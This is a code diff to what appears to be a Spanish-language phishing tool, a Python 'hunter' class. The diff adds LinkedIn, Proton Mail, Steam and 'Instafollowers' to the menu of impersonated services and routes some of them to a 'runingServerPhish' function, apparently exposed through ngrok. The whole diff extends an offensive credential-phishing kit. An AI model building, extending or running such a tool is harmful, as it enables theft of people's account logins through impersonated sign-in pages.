@@ -41,10 +41,10 @@ class hunter():
         self.verificarNgrok()
 
         print(Fore.GREEN + "SELECCIONA UNA CATEGORÍA" + Fore.RESET)
-        print("[" + Fore.RED + "1" + Fore.RESET + "] Facebook"  + "\t" + "[" + Fore.RED + "6" + Fore.RESET + "] Spotify")
-        print("[" + Fore.RED + "2" + Fore.RESET + "] Instagram" + "\t" + "[" + Fore.RED + "7" + Fore.RESET + "] Microsoft")
-        print("[" + Fore.RED + "3" + Fore.RESET + "] Twitter"   + "\t" + "[" + Fore.RED + "8" + Fore.RESET + "] GitHub")
-        print("[" + Fore.RED + "4" + Fore.RESET + "] Google"    + "\t" + "[" + Fore.RED + "9" + Fore.RESET + "] SnapChat")
+        print("[" + Fore.RED + "1" + Fore.RESET + "] Facebook"  + "\t" + "[" + Fore.RED + "6" + Fore.RESET + "] Spotify"    + "\t" + "[" + Fore.RED + "10" + Fore.RESET + "] Instafollowers")
+        print("[" + Fore.RED + "2" + Fore.RESET + "] Instagram" + "\t" + "[" + Fore.RED + "7" + Fore.RESET + "] Microsoft"  + "\t" + "[" + Fore.RED + "11" + Fore.RESET + "] Linkedin")
+        print("[" + Fore.RED + "3" + Fore.RESET + "] Twitter"   + "\t" + "[" + Fore.RED + "8" + Fore.RESET + "] GitHub"     + "\t" + "[" + Fore.RED + "12" + Fore.RESET + "] Proton Mail")
+        print("[" + Fore.RED + "4" + Fore.RESET + "] Google"    + "\t" + "[" + Fore.RED + "9" + Fore.RESET + "] SnapChat"   + "\t" + "[" + Fore.RED + "13" + Fore.RESET + "] Steam")
         print("[" + Fore.RED + "5" + Fore.RESET + "] Netflix"   + "\t" + "[" + Fore.RED + "0" + Fore.RESET + "] " + Fore.YELLOW + "Salir" + Fore.RESET)
 
         print(Fore.CYAN)
@@ -161,6 +161,12 @@ class hunter():
             self.runingServerPhish(self.routePshih)
         elif (numSelect == "9"):
             self.routePshih = "sites/snapchat"
+            self.runingServerPhish(self.routePshih)
+        elif (numSelect == "10"):
+            self.routePshih = "sites/instafollowers"
+            self.runingServerPhish(self.routePshih)
+        elif (numSelect == "11"):
+            self.routePshih = "sites/linkedin"
             self.runingServerPhish(self.routePshih)
         elif (numSelect == "0"):
             print(Back.RED + Fore.WHITE + "\n Saliendo de la aplicaicón " + Fore.RESET + Back.RESET)
